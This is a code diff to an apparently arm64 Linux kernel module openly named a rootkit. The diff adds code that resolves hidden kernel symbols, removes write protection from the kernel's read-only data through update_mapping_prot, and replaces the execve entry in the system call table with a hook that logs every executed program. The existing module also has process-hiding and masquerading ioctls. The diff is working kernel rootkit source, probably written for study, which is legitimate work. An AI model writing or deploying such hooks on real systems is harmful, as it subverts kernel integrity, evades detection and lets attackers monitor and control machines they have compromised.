@@ -26,6 +26,10 @@ struct list_head *module_list;
 
 int (*access_remote_vm_)(struct mm_struct *, unsigned long,
 		void *, int, unsigned int);
+long (*__arm64_sys_execve_)(const struct pt_regs *);
+void (*update_mapping_prot_)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
+syscall_fn_t *sys_call_table_;
+unsigned long __start_rodata_, __end_rodata_;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -37,6 +41,14 @@ static int rootkit_open(struct inode *inode, struct file *filp)
 static int rootkit_release(struct inode *inode, struct file *filp) {
 	printk (KERN_INFO "%s\n", __func__);
 	return 0;
+}
+
+long hook_execve (const struct pt_regs* regs) {
+    char path[PATH_MAX];
+    if (copy_from_user(path, regs->regs[0], PATH_MAX))
+        printk (KERN_INFO "copy_from_user fail.\n");
+	printk (KERN_INFO "exec %s\n", path);
+    return __arm64_sys_execve_(regs);
 }
 
 // Check get_mm_cmdline
@@ -98,6 +110,8 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     struct masq_proc *masq;
     switch(ioctl) {
         case IOCTL_MOD_HOOK:
+            update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
+            sys_call_table_[__NR_execve] = hook_execve;
             //do something
             break;
         case IOCTL_MOD_HIDE:
@@ -162,6 +176,16 @@ static void ksym_lookup(void) {
     unregister_kprobe(&kp);
 
     access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
+    __arm64_sys_execve_ = (void *)kallsyms_lookup_name("__arm64_sys_execve");
+    sys_call_table_ = (void *)kallsyms_lookup_name("sys_call_table");
+    update_mapping_prot_ = (void *)kallsyms_lookup_name("update_mapping_prot");
+    __start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
+    __end_rodata_ = (void *)kallsyms_lookup_name("__end_rodata");
+    
+    printk (KERN_INFO "%px\n", __arm64_sys_execve_);
+    printk (KERN_INFO "%px\n", sys_call_table_);
+    printk (KERN_INFO "%px\n", sys_call_table_[__NR_execve]);
+    printk (KERN_INFO "%px %px\n", __start_rodata_, __end_rodata_);
 }
 
 static int __init rootkit_init(void)
@@ -196,7 +220,8 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-	// TODO: unhook syscall
+    sys_call_table_[__NR_execve] = __arm64_sys_execve_;
+	// TODO: restore .rodata protect?
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
